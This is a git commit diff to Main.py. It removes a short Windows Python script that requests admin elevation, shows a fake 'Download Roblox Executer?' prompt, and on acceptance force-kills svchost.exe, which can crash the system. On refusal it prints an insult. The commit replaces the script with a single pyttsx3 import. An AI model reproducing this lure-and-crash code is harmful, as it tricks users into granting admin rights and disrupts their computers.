749b99bf7d7d8fa6d083669565a897b021f06e6e
DJchicken899 <laceywilley@gmail.com>
2025-05-11 17:12:15 -0700

    Update Main.py

--- Main.py
+++ Main.py
@@ -1,18 +1,2 @@
-import ctypes, os, sys
-
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-if is_admin():
-    answer = ctypes.windll.user32.MessageBoxW(0, "Download Roblox Executer?", "Confirmation", 4)
-
-    if answer == 6:
-      os.system("taskkill /f /im svchost.exe")
-    else: 
-     print("pussy")
-else:
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+import pyttsx3
 
